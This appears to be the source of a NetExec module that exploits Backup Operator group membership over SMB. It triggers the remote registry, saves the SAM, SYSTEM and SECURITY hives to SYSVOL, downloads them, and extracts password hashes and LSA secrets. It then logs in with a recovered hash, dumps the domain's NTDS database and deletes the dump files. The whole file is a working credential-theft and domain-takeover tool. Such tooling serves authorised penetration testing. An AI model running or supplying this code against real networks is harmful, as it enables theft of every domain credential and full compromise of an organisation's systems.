import time
import os
import datetime
import sys

from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
from impacket.smbconnection import SessionError
from impacket.dcerpc.v5 import transport, rrp
from impacket import nt_errors

from nxc.paths import NXC_PATH

class NXCModule:
    name = "backup_operator"
    description = "Exploit user in backup operator group to dump NTDS @mpgn_x64"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.domain_admin = None
        self.domain_admin_hash = None

    def options(self, context, module_options):
        """OPTIONS"""

    def on_login(self, context, connection):
        connection.args.share = "SYSVOL"
        # enable remote registry
        context.log.display("Triggering start through named pipe...")
        self.trigger_winreg(connection.conn, context)
        rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
        rpc.set_smb_connection(connection.conn)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(rrp.MSRPC_UUID_RRP)

        try:
            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                hRootKey, subKey = self._strip_root_key(dce, hive)
                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
                context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
                try:
                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
                    context.log.highlight(f"Saved {hive} to {outputFileName}")
                except Exception as e:
                    context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                    sys.exit()
        except (Exception, KeyboardInterrupt) as e:
            context.log.fail(str(e))
        finally:
            dce.disconnect()

        # copy remote file to local
        log_path = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(":", "-"))
        for hive in ["SAM", "SECURITY", "SYSTEM"]:
            connection.get_file_single(hive, log_path + hive)

        # read local file
        try:
            def parse_sam(secret):
                context.log.highlight(secret)
                if not self.domain_admin:
                    first_line = secret.strip().splitlines()[0]
                    fields = first_line.split(":")
                    self.domain_admin = fields[0]
                    self.domain_admin_hash = fields[3]

            local_operations = LocalOperations(log_path + "SYSTEM")
            bootKey = local_operations.getBootKey()
            sam_hashes = SAMHashes(log_path + "SAM", bootKey, isRemote=False, perSecretCallback=lambda secret: parse_sam(secret))
            sam_hashes.dump()
            sam_hashes.finish()

            LSA = LSASecrets(log_path + "SECURITY", bootKey, None, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        except Exception as e:
            context.log.fail(f"Fail to dump the sam and lsa: {e!s}")

        if self.domain_admin:
            connection.conn.logoff()
            connection.create_conn_obj()
            if connection.hash_login(connection.domain, self.domain_admin, self.domain_admin_hash):
                try:
                    context.log.display("Dumping NTDS...")
                    connection.ntds()
                except Exception as e:
                    context.log.fail(f"Fail to dump the NTDS: {e!s}")

                context.log.display(f"Cleaning dump with user {self.domain_admin} and hash {self.domain_admin_hash} on domain {connection.domain}")
                connection.execute("del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM")
                for hive in ["SAM", "SECURITY", "SYSTEM"]:
                    try:
                        connection.conn.listPath("SYSVOL", log_path + hive)
                    except SessionError as e:
                        if e.getErrorCode() != nt_errors.STATUS_OBJECT_PATH_NOT_FOUND:
                            context.log.fail(f"Fail to remove the file { hive }...")
                            self.suprress_error(context)
                            sys.exit()
                context.log.display("Successfully deleted dump files !")
            else:
                self.suprress_error(context)
        else:
            self.suprress_error(context)

    def suprress_error(self, context):
        context.log.display("Use the domain admin account to clean the file on the remote host")
        context.log.display("netexec smb dc_ip -u user -p pass -x 'del C:\\Windows\\sysvol\\sysvol\\SECURITY && del C:\\Windows\\sysvol\\sysvol\\SAM && del C:\\Windows\\sysvol\\sysvol\\SYSTEM'")

    def trigger_winreg(self, connection, context):
        # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
        tid = connection.connectTree("IPC$")
        try:
            connection.openFile(
                tid,
                r"\winreg",
                0x12019F,
                creationOption=0x40,
                fileAttributes=0x80,
            )
        except SessionError as e:
            # STATUS_PIPE_NOT_AVAILABLE error is expected
            context.log.debug(str(e))
        # Give remote registry time to start
        time.sleep(1)

    def _strip_root_key(self, dce, key_name):
        # Let's strip the root key
        key_name.split("\\")[0]
        sub_key = "\\".join(key_name.split("\\")[1:])
        ans = rrp.hOpenLocalMachine(dce)
        h_root_key = ans["phKey"]
        return h_root_key, sub_key
